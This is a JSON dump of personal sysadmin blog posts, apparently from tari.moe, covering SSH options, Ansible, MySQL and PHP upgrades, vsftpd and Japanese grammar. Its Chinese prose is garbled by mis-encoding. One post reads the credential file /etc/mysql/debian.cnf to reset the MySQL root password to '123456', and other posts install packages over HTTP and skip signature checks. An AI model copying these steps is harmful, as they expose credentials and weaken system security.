Groupï¼‰æ‰€åˆ¶å®šï¼ŒSSHæ˜¯ä¸€é¡¹åˆ›å»ºåœ¨åº”ç”¨å±‚å’Œä¼ è¾“å±‚åŸºç¡€ä¸Šçš„å®‰å…¨åè®®ï¼Œä¸ºè®¡ç®—æœºçš„shellæä¾›å®‰å…¨çš„ä¼ è¾“å’Œä½¿ç”¨ç¯å¢ƒã€‚ä¸‹é¢æˆ‘ä»¬æ¥ä»‹ç» SSH çš„ 7 å¤§ç”¨æ³•ã€‚ åŸºæœ¬ç”¨æ³•æœ€ç®€å•çš„ç”¨æ³•å°±æ˜¯ä¸å¸¦å‚æ•°ï¼Œä»…è¾“å…¥ ssh å†åŠ ä¸Šä¸»æœºåœ°å€ï¼Œæ¯”å¦‚ï¼š ssh 192.168.0.116è¿™ç§å½¢å¼ç™»é™†ä¸»æœºï¼Œä¼šé»˜è®¤ä½¿ç”¨å½“å‰ç”¨æˆ·è¿›è¡Œç™»å½•ã€‚ç¬¬ä¸€æ¬¡è¿æ¥çš„æ—¶å€™ï¼ŒSSH ä¼šç¡®è®¤ç›®æ ‡ä¸»æœºçš„çœŸå®æ€§ï¼Œå¦‚æœæ²¡æœ‰é—®é¢˜çš„è¯ï¼Œè¾“å…¥ yes å³å¯ã€‚ å¦‚æœæˆ‘ä»¬æƒ³è¦ä»¥æŒ‡å®šç”¨æˆ·åæ¥ç™»å½•ä¸»æœºï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š a. ä½¿ç”¨ -l é€‰é¡¹ 1ssh -l alvin 192.168.0.116 b. ä½¿ç”¨ user@hostname æ ¼å¼ 1ssh alvin@192.168.0.116 è¿™ä¸¤ç§æ–¹æ³•ï¼Œå…¶ä¸­ç¬¬äºŒç§å°¤ä¸ºå¸¸ç”¨ã€‚ æŒ‡å®šç«¯å£ç™»å½•SSH é»˜è®¤ä½¿ç”¨çš„ç«¯å£å·æ˜¯ 22ã€‚å¤§å¤šç°ä»£çš„ Linux ç³»ç»Ÿ 22 ç«¯å£éƒ½æ˜¯å¼€æ”¾çš„ã€‚å¦‚æœä½ è¿è¡Œ ssh ç¨‹åºè€Œæ²¡æœ‰æŒ‡å®šç«¯å£å·ï¼Œå®ƒç›´æ¥å°±æ˜¯é€šè¿‡ 22 ç«¯å£å‘é€è¯·æ±‚çš„ã€‚ å¦‚æœæˆ‘ä»¬ä¸æƒ³é€šè¿‡ 22 ç«¯å£ç™»å½•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ -p é€‰é¡¹æ¥æŒ‡å®šç«¯å£ã€‚ 1ssh 192.168.0.116 -p 1234 å¼•ç”³è¯é¢˜ï¼šå¦‚ä½•ä¿®æ”¹ç«¯å£å·ï¼Ÿåªéœ€ä¿®æ”¹ /etc/ssh/ssh_config ï¼Œä¿®æ”¹å¦‚ä¸‹ä¸€è¡Œï¼š 1Port 22 å¯¹æ‰€æœ‰æ•°æ®è¯·æ±‚å‹ç¼©ä½¿ç”¨ -C é€‰é¡¹ï¼Œæ‰€æœ‰é€šè¿‡ SSH å‘é€æˆ–æ¥æ”¶çš„æ•°æ®å°†ä¼šè¢«å‹ç¼©ï¼Œå¹¶ä¸”ä»»ç„¶æ˜¯åŠ å¯†çš„ã€‚ 1ssh -C 192.168.0.116 ä½†æ˜¯ï¼Œè¿™ä¸ªé€‰é¡¹åœ¨ç½‘é€Ÿä¸æ˜¯å¾ˆå¿«çš„æ—¶å€™æ¯”è¾ƒæœ‰ç”¨ï¼Œè€Œå½“ç½‘é€Ÿè¾ƒå¿«çš„æ—¶å€™ï¼Œä½¿ç”¨å‹ç¼©åè€Œä¼šé™ä½æ•ˆç‡ï¼Œæ‰€ä»¥è¦è§†æƒ…å†µä½¿ç”¨ã€‚ æ‰“å¼€è°ƒè¯•æ¨¡å¼å› ä¸ºæŸäº›åŸå› ï¼Œæˆ‘ä»¬æƒ³è¦è¿½è¸ªè°ƒè¯•æˆ‘ä»¬å»ºç«‹çš„ SSH è¿æ¥æƒ…å†µã€‚SSH æä¾›çš„ -v é€‰é¡¹å‚æ•°æ­£æ˜¯ä¸ºæ­¤è€Œè®¾çš„ã€‚å…¶å¯ä»¥çœ‹åˆ°åœ¨å“ªä¸ªç¯èŠ‚å‡ºäº†é—®é¢˜ã€‚ 12345678910111213[Alvin.Alvin-computer] â¤ ssh -v pi@192.168.0.116OpenSSH_7.1p2, OpenSSL 1.0.1g 7 Apr 2014debug1: Reading configuration data /etc/ssh_configdebug1: Connecting to 192.168.0.116 [192.168.0.116] port 22.debug1: Connection established.debug1: key_load_public: No such file or directorydebug1: Enabling compatibility mode for protocol 2.0debug1: Local version string SSH-2.0-OpenSSH_7.1debug1: Remote protocol version 2.0, remote software version OpenSSH_7.4p1 Raspbian-10+deb9u4debug1: match: OpenSSH_7.4p1 Raspbian-10+deb9u4 pat OpenSSH* compat 0x04000000debug1: Authenticating to 192.168.0.116:22 as &#x27;pi&#x27;debug1: SSH2_MSG_KEXINIT sentdebug1: SSH2_MSG_KEXINIT received ç»‘å®šæºåœ°å€å¦‚æœä½ çš„å®¢æˆ·ç«¯æœ‰å¤šäºä¸¤ä¸ªä»¥ä¸Šçš„ IP åœ°å€ï¼Œä½ å°±ä¸å¯èƒ½åˆ†å¾—æ¸…æ¥šåœ¨ä½¿ç”¨å“ªä¸€ä¸ª IP è¿æ¥åˆ° SSH æœåŠ¡å™¨ã€‚ä¸ºäº†è§£å†³è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ -b é€‰é¡¹æ¥æŒ‡å®šä¸€ä¸ªIP åœ°å€ã€‚è¿™ä¸ª IP å°†ä¼šè¢«ä½¿ç”¨åšå»ºç«‹è¿æ¥çš„æºåœ°å€ã€‚ 12345678910[Alvin.Alvin-computer] â¤ ssh -b 192.168.0.105 pi@192.168.0.116Linux raspberrypi 4.14.71-v7+ #1145 SMP Fri Sep 21 15:38:35 BST 2018 armv7lThe programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Feb 24 08:52:29 2019 from 192.168.0.105 è¿œç¨‹æ‰§è¡Œå‘½ä»¤å¦‚æœæˆ‘ä»¬æƒ³åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œæˆ‘ä»¬é€šå¸¸çš„åšæ³•æ˜¯ï¼Œå…ˆç™»å½•åˆ°ç›®æ ‡ä¸»æœºï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œå†é€€å‡ºæ¥ã€‚è¿™æ ·åšå½“ç„¶æ˜¯å¯ä»¥ï¼Œä½†æ˜¯æ¯”è¾ƒéº»çƒ¦ã€‚ å¦‚æœæˆ‘ä»¬ä»…ä»…æ˜¯æƒ³è¿œç¨‹æ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œå¯ä»¥ç›´æ¥åœ¨åé¢è·Ÿä¸Šå‘½ä»¤å°±å¥½ï¼Œå¦‚ä¸‹ï¼š 123456[Alvin.Alvin-computer] â¤ ssh pi@192.168.0.116 ls -lDesktopDocumentsDownloadsMagPiMusic æŒ‚è½½è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿå¦å¤–ä¸€ä¸ªå¾ˆèµçš„åŸºäº SSH çš„å·¥å…·å« sshfsã€‚ sshfs å¯ä»¥è®©ä½ åœ¨æœ¬åœ°ç›´æ¥æŒ‚è½½è¿œç¨‹ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿã€‚å®ƒçš„ä½¿ç”¨æ ¼å¼å¦‚ä¸‹ï¼š 1sshfs -o idmap=user user@hostname:/home/user ~/Remote æ¯”å¦‚ï¼š 1sshfs -o idmap=user pi@192.168.0.116:/home/pi ~/Pi è¿™ä¸ªå‘½ä»¤å¯ä»¥å°†è¿œç¨‹ä¸»æœº pi ç”¨æˆ·çš„ä¸»ç›®å½•æŒ‚è½½åˆ°æœ¬åœ°ä¸»ç›®å½•ä¸‹çš„ Pi æ–‡ä»¶å¤¹ã€‚ ç±»ä¼¼æ–‡ç« è‰¯è®¸Linux æ’é™¤Linuxæœºå™¨æ˜¯å¦è¢«å…¥ä¾µ","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"SSH","slug":"è¿ç»´/SSH","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/SSH/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"SSH","slug":"SSH","permalink":"https://tari.moe/tags/SSH/"}]},{"title":"åˆè¯† ansible (ä¸€)","slug":"åˆè¯†-ansible-1","date":"2019-07-06T01:03:58.000Z","updated":"2021-04-02T02:28:41.835Z","comments":true,"path":"2019/07/06/åˆè¯†-ansible-1/","link":"","permalink":"https://tari.moe/2019/07/06/%E5%88%9D%E8%AF%86-ansible-1/","excerpt":"","text":"ä¸ªäººè¸©æ»´å°å‘è¦æ³¨æ„ä¸‹ä¸‹, ä¸€äº›å‚æ•°çš„å«ä¹‰æ˜¯ä»€ä¹ˆ, å¥½æ¯”æˆ‘è°ƒç”¨ script æ¨¡å—, æƒ³æŠŠè„šæœ¬è°ƒç”¨åˆ°ç›®æ ‡æœåŠ¡å™¨å»æ‰§è¡Œ 12- name: backup base system version script: /baseVersionBackup.sh ä¼ å…¥è„šæœ¬å‚æ•°1, 2, 3.... â€œæœºæ™ºâ€ çš„æˆ‘ä»¥ä¸ºè¿™æ˜¯åˆ°å¯¹æ–¹æœåŠ¡å™¨çš„æ ¹ç›®å½•æ‰§è¡Œè„šæœ¬â€¦.emmmmmm** æ³¨æ„ chdir æ˜¯è„šæœ¬åœ¨å¯¹æ–¹æœåŠ¡å™¨æ‰§è¡Œçš„ç›®å½•, baseVersionBackup.sh æ˜¯ä½ æœ¬æœºè„šæœ¬çš„ä½ç½® ** 123# æ­£ç¡®æ“ä½œ- name: backup base system version script: chdir=/ baseVersionBackup.sh ä¼ å…¥è„šæœ¬å‚æ•°1, 2, 3.... ansible: åŸºäºkeyçš„éªŒè¯æ˜¯ä¸€åŸºæœ¬è¦æ±‚ç‰¹æ€§: æ¨¡å—åŒ– æœ‰Paramiko, PyYAML, Jinja2(æ¨¡å—è¯­è¨€)ä¸‰ä¸ªå…³é”®æ¨¡å— æ”¯æŒè‡ªå®šä¹‰æ¨¡å— åŸºäºpythonå®ç° éƒ¨ç½²ç®€å•ï¼ŒåŸºäºpythonå’Œssh(é»˜è®¤å·²å®‰è£…), agentless å®‰å…¨, åŸºäºOpenSSH æ”¯æŒplaybookç¼–æ’ä»»åŠ¡ å¹‚ç­‰æ€§: ä¸€ä¸ªä»»åŠ¡æ‰§è¡Œä¸€éå’Œæ‰§è¡Œné, ä¸å› é‡å¤æ‰§è¡Œå¸¦æ¥æ„å¤–æƒ…å†µ æ— éœ€ä»£ç†ä¸ä¾èµ–PKI(æ— éœ€ssl) å¯ä½¿ç”¨ä»»ä½•å˜æˆè¯­è¨€å†™æ¨¡å— YAMLæ ¼å¼ï¼Œç¼–æ’ä»»åŠ¡ï¼Œæ”¯æŒä¸°å¯Œçš„æ•°æ®ç»“æ„ è¾ƒå¼ºå¤§çš„å¤šå±‚è§£å†³æ–¹æ¡ˆ é…ç½®æ–‡ä»¶ /etc/ansible/ansible.cfg ä¸»é…ç½®æ–‡ä»¶ï¼Œé…ç½®ansibleå·¥ä½œç‰¹æ€§(ä¸€èˆ¬ä¿æŒé»˜è®¤) ä¸ºä»€ä¹ˆæˆ‘æ‰§è¡Œçš„ansibleæŒ‡ä»¤å¯¹æ–¹å°±èƒ½æ‰§è¡Œï¼Ÿ(tmpæ‰§è¡Œå®Œä¼šåˆ é™¤) è„šæœ¬çš„ä¸´æ—¶ç›®å½•:remote_tmp = ~/.ansible/tmplocal_tmp = ~/.ansible/tmp forks å¹¶å‘æ‰§è¡Œ poll_interval å¤šé•¿æ—¶é—´å»æ‹‰ä¸€æ¬¡æ•°æ® sudo_user é»˜è®¤ç”¨æˆ· ask_sudo_pass æ˜¯å¦è¯¢é—®å£ä»¤ ask_pass æ˜¯å¦æ”¯æŒå£ä»¤ host_key_checking æ˜¯å¦æ£€æŸ¥å¯¹åº”æœåŠ¡å™¨çš„host_key, å»ºè®®å–æ¶ˆæ³¨é‡Š log_path æ—¥å¿—å»ºè®®æ‰“å¼€ /etc/ansible/hosts ä¸»æœºæ¸…å• åˆ†ç»„: [webserver] # å†™åŸŸåéœ€è¦å€ŸåŠ©dnså»è§£æ 10.10.0.1[18:20] 10.10.0.92:8080 www[01:100].example.com db-[a:f].example.com sshåŸºäºkeyéªŒè¯: ssh-keygen è¾“å…¥å®ŒååŠ ä¸€ä¸‹ç§˜é’¥ ssh-copy-id ipåœ°å€ Host-pattern: ALLã€é€šé…ç¬¦* æˆ–å…³ç³»ï¼Œå¦‚: ansible â€œgroup1:group2â€ æˆ–è€… ansible â€œip1:ip2â€ ä¸å…³ç³»ï¼Œå¦‚: ansible â€œgroup1:&amp;group2â€ ä¸¤ä¸ªç»„éƒ½åœ¨çš„ä¸»æœº éå…³ç³»ï¼Œå¦‚: ansible â€œgroup1:!group2â€ åœ¨ç»„1ä¸åœ¨ç»„2 ç»¼åˆå…³ç³»,å¦‚: ansible â€œgroup1:group2:&amp;group3:!group4â€ æ­£åˆ™è¡¨è¾¾å¼ â€œ~(web|file).*\\.fosu\\.comâ€ /etc/ansible/roles/ å­˜æ”¾è§’è‰²çš„ç›®å½• ç¨‹åº /usr/bin/ansible ä¸»ç¨‹åºï¼Œä¸´æ—¶å‘½ä»¤æ‰§è¡Œå·¥å…· â€“version -m æ¨¡å— é»˜è®¤command ä¾‹å¦‚ping -a æ¨¡å—å‚æ•° -v -vv -vvv â€“list-hosts æ˜¾ç¤ºä¸»æœºåˆ—è¡¨ -k æç¤ºè¾“å…¥sshè¿æ¥å¯†ç ï¼Œé»˜è®¤KeyéªŒè¯ -K æç¤ºè¾“å…¥sudoæ—¶çš„å£ä»¤ -C æ£€æŸ¥ï¼Œå¹¶ä¸æ‰§è¡Œ -T TIMEOUT é»˜è®¤10s -u æ‰§è¡Œè¿œç¨‹æ‰§è¡Œçš„ç”¨æˆ· -b sudo /usr/bin/ansible-doc æŸ¥çœ‹é…ç½®æ–‡æ¡£ï¼Œæ¨¡å—åŠŸèƒ½æŸ¥çœ‹å·¥å…· -a å¯ä»¥åˆ—å‡ºå½“å‰æ¨¡å—åˆ—è¡¨ï¼Œå¾ˆå¤šâ€¦ -l æ¯”è¾ƒå¸¸ç”¨ ansible-doc -l ping -s ç‰‡æ®µè§£é‡Š æ‰§è¡Œè¿‡ç¨‹: 1.åŠ è½½è‡ªå·±çš„é…ç½®æ–‡ä»¶ é»˜è®¤/etc/ansible/ansible.cfg 2.åŠ è½½è‡ªå·±å¯¹åº”çš„æ¨¡å—æ–‡ä»¶,å¦‚command 3.é€šè¿‡ansibleå°†æ¨¡å—æˆ–å‘½ä»¤ç”Ÿæˆå¯¹åº”çš„ä¸´æ—¶pyæ–‡ä»¶å¹¶å°†è¯¥æ–‡ä»¶ä¼ è¾“è‡³è¿œç¨‹æœåŠ¡å™¨çš„å¯¹åº”æ‰§è¡Œç”¨æˆ· $HOME/.ansible/tmp/ansible-tmp-æ•°ç»„/xxx.pyæ–‡ä»¶ 4.ç»™æ–‡ä»¶+xæ‰§è¡Œ 5.æ‰§è¡Œå¹¶è¿”å›ç»“æœ 6.åˆ é™¤ä¸´æ—¶pyæ–‡ä»¶, sleep 0é€€å‡º æ‰§è¡ŒçŠ¶æ€: ç»¿è‰²:æ‰§è¡ŒæˆåŠŸå¹¶ä¸”ä¸éœ€è¦åšæ”¹å˜çš„æ“ä½œ é»„è‰²:æ‰§è¡ŒæˆåŠŸå¹¶ä¸”å¯¹ç›®æ ‡ä¸»æœºåšå˜æ›´ çº¢è‰²:æ‰§è¡Œå¤±è´¥ /usr/bin/ansible-galaxy ä¸‹è½½/ä¸Šä¼ ä¼˜ç§€ä»£ç æˆ–Rolesæ¨¡å—çš„å®˜ç½‘å¹³å° /usr/bin/ansible-playbook å®šåˆ¶è‡ªåŠ¨åŒ–ä»»åŠ¡ï¼Œç¼–æ’å‰§æœ¬å·¥å…·/usr/bin/ansible-pullè¿œç¨‹æ‰§è¡Œå‘½ä»¤å·¥å…· /usr/bin/ansible-valut æ–‡ä»¶åŠ å¯†å·¥å…· /usr/bin/ansible-console åŸºäºConsoleç•Œé¢ä¸ç”¨æˆ·äº¤äº’çš„æ‰§è¡Œå·¥å…· è‡ªåŠ¨åŒ–è¿ç»´åº”ç”¨åœºæ™¯ æ–‡ä»¶ä¼ è¾“ å‘½ä»¤æ‰§è¡Œ åº”ç”¨éƒ¨ç½² é…ç½®ç®¡ç† ä»»åŠ¡æµç¼–æ’ å·¥å…·ï¼š Ansible é€‚åˆä¸­å°å‹ä¼ä¸š Puppet é€‚åˆå¤§å‹å…¬å¸ï¼Œä¾‹å¦‚è°·æ­Œ ç›¸å…³æ¦‚å¿µï¼šä»£ç å‘å¸ƒæœº(å ¡å’æœº)é€šå¸¸å­˜åœ¨å‘å¸ƒç¯å¢ƒä¸­ï¼šè´Ÿè´£æŠŠåœ¨å¼€å‘å®Œæˆç»æµ‹è¯•æ²¡é—®é¢˜åå‘å¸ƒåˆ°ç”Ÿäº§ç¯å¢ƒä¸­é€šå¸¸éœ€è¦2å°(ä¸»å¤‡)","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"è¿ç»´/ansible","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/ansible/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"ansible","permalink":"https://tari.moe/tags/ansible/"}]},{"title":"MySQL upgrade, from 5.5.* to 5.7.*","slug":"MySQL_upgrade_from_5.5.*_to_5.7.*","date":"2019-07-02T18:16:54.000Z","updated":"2021-04-02T02:17:19.290Z","comments":true,"path":"2019/07/03/MySQL_upgrade_from_5.5.*_to_5.7.*/","link":"","permalink":"https://tari.moe/2019/07/03/MySQL_upgrade_from_5.5.*_to_5.7.*/","excerpt":"","text":"æœåŠ¡å™¨ç‰ˆæœ¬ Ubuntu14.04å¤‡ä»½(å¿«ç…§)æ—¥å¸¸å¿˜è®°å¯†ç  -,- (çŸ¥é“å¯†ç æ»´è¯·ç›´æ¥è·³è‡³ å¼€å§‹å‡çº§è‡³5.7.* )ä»‹ç»ä¸€ä¸ªç®€å•ä¿®æ”¹æ•°æ®åº“å¯†ç çš„æ–¹æ³• 1sudo cat /etc/mysql/debian.cnf çº¢çº¿é€‰ä¸­éƒ¨åˆ†ä¸ºæˆ‘æœ¬åœ°mysqlçš„ç”¨æˆ·å’Œå¯†ç (passwordéƒ¨åˆ†æ¯ä¸ªäººä¸åŒçš„å–”!)å­˜åœ¨mysqlçš„debian-sys-maintç”¨æˆ·å’Œå¯†ç ,é‚£ä»–ä»¬æ˜¯æ€ä¹ˆæ¥çš„å‘¢? å…ˆå‡ç§‘æ™®ä¸€æ³¢, æ­£å¦‚å®ƒçš„å­—é¢æ„æ€ï¼ˆDebian System Matainenceï¼‰ï¼ŒDebianç³»ç»Ÿå¯¹MySQLç»´æŠ¤ç”¨çš„ï¼Œä½ å¯ä»¥ç†è§£ä¸ºé€šè¿‡ç³»ç»Ÿçš„æŸä¸ª â€œéå¸¸è§„â€ ç¨‹åºå¯¹Mysqlè¿›è¡Œå¤‡ä»½æ¢å¤ç­‰è¡Œä¸ºæ—¶ï¼Œè¯¥ç¨‹åºæ‰€ä½¿ç”¨çš„ç™»å½•Mysqlçš„è´¦æˆ·ã€‚ ä½¿ç”¨ä»¥ä¸Šè´¦å·å¯†ç ç™»å½•è‡³mysqlæ‰§è¡Œä¸‹é¢ä¸‰æ¡å‘½ä»¤å°±å¯ä»¥æŠŠå¯†ç æ›´æ”¹ä¸º 123456å•¦! 1234567use mysql;update user set authentication_string=password(&#x27;123456&#x27;) where user=&#x27;root&#x27;;update user set plugin=&#x27;mysql_native_password&#x27;;flush privileges; ç™»å½•éªŒè¯ä¸‹å³å¯ 1mysql -u root -p å¼€å§‹å‡çº§è‡³5.7.*é»˜è®¤æƒ…å†µä¸‹ï¼Œaptæ˜¯æ— æ³•ç›´æ¥å‡çº§åˆ°mysql5.7çš„ï¼Œå› æ­¤éœ€è¦é¢å¤–è®¾ç½® é¦–å…ˆï¼Œå¤‡ä»½æ•°æ®ï¼Œå°½ç®¡ä¸‹é¢çš„æ–¹å¼ä¸ä¼šä¸¢å¤±ä½ çš„æ•°æ®ï¼Œä½†æ˜¯ä¸ºäº†å®‰å…¨è€ƒè™‘ï¼Œå»ºè®®å¤‡ä»½ã€‚ ä¸‹è½½mysql-aptçš„é…ç½®åŒ…ï¼Œå¹¶å®‰è£… 123wget https://dev.mysql.com/get/mysql-apt-config_0.8.1-1_all.debsudo dpkg -i mysql-apt-config_0.8.1-1_all.deb åœ¨å®‰è£…çš„è¿‡ç¨‹ä¸­ï¼Œä¼šè¦æ±‚é€‰æ‹©mysqlç‰ˆæœ¬ï¼Œé€‰æ‹©mysql5.7ç‰ˆæœ¬åï¼Œç‚¹å‡»â€œOKâ€ã€‚ æ›´æ–°æºå¹¶å®‰è£…æ•°æ®åº“ï¼Œåœ¨å®‰è£…è¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨å¸è½½å·²ç»å®‰è£…çš„è€ç‰ˆæœ¬æ•°æ®ã€‚ 1sudo apt-get update &amp;&amp; sudo apt-get install mysql-server å®‰è£… mysql åï¼Œä½¿ç”¨mysql_upgradeå‡çº§æ•°æ®åº“æ–‡ä»¶ç‰ˆæœ¬(å¿…é¡»æ˜¯rootç”¨æˆ·å–”!) 1sudo mysql_upgrade -uroot -p é‡å¯mysql,å¹¶æ£€æŸ¥æ•°æ®æ˜¯å¦æ­£å¸¸ 123sudo service mysql restartmysqlcheck -uroot -p --all-databases å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œæ‰€æœ‰è¡¨çš„æ£€æŸ¥ç»“æœå‡æ˜¯okçŠ¶æ€ã€‚ åŒæ—¶ï¼Œä¹Ÿå¯ä»¥è¿›å…¥mysqlä½¿ç”¨select version()ï¼› æ¥æŸ¥çœ‹mysql-server ç‰ˆæœ¬å·ã€‚ æ›´æ–°è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ï¼š åœ¨ubuntu 14çš„ç‰ˆæœ¬ä¸­ï¼Œå®‰è£…äº†mysql åï¼Œå¯åŠ¨æ—¶ï¼Œç¨‹åºæç¤º â€œNo directory, logging in with HOME=/â€ã€‚ å…·ä½“å¦‚ä¸‹ï¼š 12345678root@xxx:/etc/mysql# service mysql restart \\* Stopping MySQL Community Server 5.7.11... \\* MySQL Community Server 5.7.11 is stopped \\* Re-starting MySQL Community Server 5.7.11No directory, logging in with HOME=/.. \\* MySQL Community Server 5.7.11 is started è§£å†³åŠæ³•ï¼š 123sudo service MySQL stopsudo usermod -d /var/lib/mysql/ mysqlsudo service mysql start æ›´æ–°mysqlç‰ˆæœ¬åï¼Œæ‰€æœ‰çš„é…ç½®æ–‡ä»¶éƒ½ä¼šè¢«åˆ é™¤ï¼Œå› æ­¤éœ€è¦ä¿®æ”¹mysqlé…ç½®è¯´äººè¯å°±æ˜¯ï¼Œè¿œç¨‹æ˜¯è®¿é—®ä¸åˆ°æœ¬æ•°æ®åº“çš„ æŠŠ /etc/mysql/mysql.conf.d/mysql.cnf é…ç½®æ–‡ä»¶ä¸­#bind-address =127.0.0.1 çš„æ³¨é‡Šç¬¦å·å»æ‰å³å¯","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"PHP upgrade, from 5.5.* to 7.2.*","slug":"PHP_upgrade_from_5.5.*_to_7.2.24","date":"2019-07-02T17:16:24.000Z","updated":"2021-04-02T02:17:38.948Z","comments":true,"path":"2019/07/03/PHP_upgrade_from_5.5.*_to_7.2.24/","link":"","permalink":"https://tari.moe/2019/07/03/PHP_upgrade_from_5.5.*_to_7.2.24/","excerpt":"","text":"æœåŠ¡å™¨ç‰ˆæœ¬ CentOS6å¤‡ä»½(å¿«ç…§)é¦–å…ˆå¸è½½å½“å‰ç‰ˆæœ¬PHP1sudo yum remove php* é…ç½®yumä»“åº“åœ¨CentOS6/7å‡çº§PHPè‡³7.* éœ€è¦å¼€å¯Remiå’ŒEPELä»“åº“ 123yum install epel-releaserpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm å®‰è£…PHP7.2éœ€è¦åœ¨yumä¸­æŒ‡å®šéœ€è¦ä½¿ç”¨çš„ç›¸å…³ä»“åº“ 1yum --enablerepo=remi-php72 install php å®‰è£…å®Œæˆåæ£€æŸ¥ PHP ç‰ˆæœ¬ 1php -v å®‰è£…ç›¸å…³ PHP æ¨¡å—1yum --enablerepo=remi-php72 install php-xml php-soap php-xmlrpc php-mbstring php-json php-gd php-mcrypt php-fpm è¿™é‡Œæœ‰ä¸ªå°å‘,æˆ‘åœ¨å®‰è£…php-gdçš„æ—¶å€™ä¼šå¼¹å‡ºä¸€ä¸‹é”™è¯¯ 123Error: Package: gd-last-2.2.5-5.el6.remi.x86_64 (remi-safe) Requires: libwebp.so.5()(64bit) You could try using --skip-broken to work around the problem è°·æ­Œlibwebp.so.5()(64bit)è¿™ä¸ªä¾èµ–é¡¹åå‘ç°ä»¥ä¸‹ä¸¤ä¸ªé“¾æ¥ https://pkgs.org/download/libwebp.so.5()(64bit)https://centos.pkgs.org/6/atomic-x86_64/libwebp-0.4.3-3.el6.art.x86_64.rpm.html äºæ˜¯é¡ºåŠ¿æ‰¾åˆ°rpmåŒ…é“¾æ¥ http://www6.atomicorp.com/channels/atomic/centos/6/x86_64/RPMS/libwebp-0.4.3-3.el6.art.x86_64.rpm å®‰è£…å®ƒå°±å¥½ 1rpm -i it æ¥ä¸‹æ¥å°±å¯ä»¥å¯åŠ¨php-fpmå¹¶è®¾ç½®ä¸ºå¼€æœºå¯åŠ¨å•¦! 123sudo service php-fpm startchkconfig php-fpm on å¦‚æœéœ€è¦,ä¹ŸæŠŠmysqlæœåŠ¡è£…ä¸Š,é¡ºä¾¿å¯ç”¨å®ƒ 123yum --enablerepo=remi-php72 install php-mysqlsudo service mysql restart","categories":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://tari.moe/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"ã€Œå½¢å®¹è©ã€","slug":"ã€Œå½¢å®¹è©ã€","date":"2019-07-02T10:38:27.000Z","updated":"2021-04-02T02:13:31.280Z","comments":true,"path":"2019/07/02/ã€Œå½¢å®¹è©ã€/","link":"","permalink":"https://tari.moe/2019/07/02/%E3%80%8C%E5%BD%A2%E5%AE%B9%E8%A9%9E%E3%80%8D/","excerpt":"","text":"ã€Œãªå½¢å®¹è©ã€ ã€Œãªå½¢å®¹è©ã€+ ãª + åè¯ ï¼Œå› æ­¤ç§°ä¸ºã€Œãªå½¢å®¹è©ã€&nbsp; åè¯ + ã® + åè¯ ã«ãã‚„ã‹ï¼šçƒ­é—¹çš„ ã€Œã„å½¢å®¹è©ã€ç‰¹å¾´ï¼šã€œã„ ã„å½¢å®¹è© + åè¯ä¾‹ï¼šå¤§ãã„ä¼šç¤¾ è‚¯å®šè¡Œ å¦å®šè¡Œ ã€œã„ã¾ã™ ã€œ **ã„**ããªã„ã§ã™ å¯’ã„ã§ã™ å¯’ããªã„ã§ã™ è¾›ã„ æš–ã‹ã„ æš‘ã„ ï¼ˆé£Ÿã¹ï¼‰ãŸã„ã§ã™","categories":[{"name":"å‹‰å¼·","slug":"å‹‰å¼·","permalink":"https://tari.moe/categories/%E5%8B%89%E5%BC%B7/"}],"tags":[{"name":"å‹‰å¼·","slug":"å‹‰å¼·","permalink":"https://tari.moe/tags/%E5%8B%89%E5%BC%B7/"}]},{"title":"vsftpd upgrade, from 2.2.2 to 3.0.3","slug":"vsftpd_upgrade_from_2.2.2_to_3.0.3","date":"2019-07-01T07:33:24.000Z","updated":"2021-04-02T02:27:05.979Z","comments":true,"path":"2019/07/01/vsftpd_upgrade_from_2.2.2_to_3.0.3/","link":"","permalink":"https://tari.moe/2019/07/01/vsftpd_upgrade_from_2.2.2_to_3.0.3/","excerpt":"","text":"è®°ä¸€æ¬¡vsftpd å‡çº§è¿‡ç¨‹å¤‡ä»½(å¿«ç…§)æ”¶é›†ç³»ç»Ÿä¿¡æ¯ä»¥åŠåŸæœ‰vsftpdå®‰è£…ç‰ˆæœ¬ä¿¡æ¯123uname -arpm -qa | grep vsftpdvsftpd -v å¸è½½åŸ vsftpd1rpm -e vsftpd-****** GPGç­¾åè®¤è¯ç”±äºæ²¡ç”¨åˆ°å…¬é’¥,å› æ­¤è·³è¿‡ä¸‹é¢ä¸¤æ¡å‘½ä»¤ 12gpg -import publickeygpg -verify ***.asc(.sig) *** 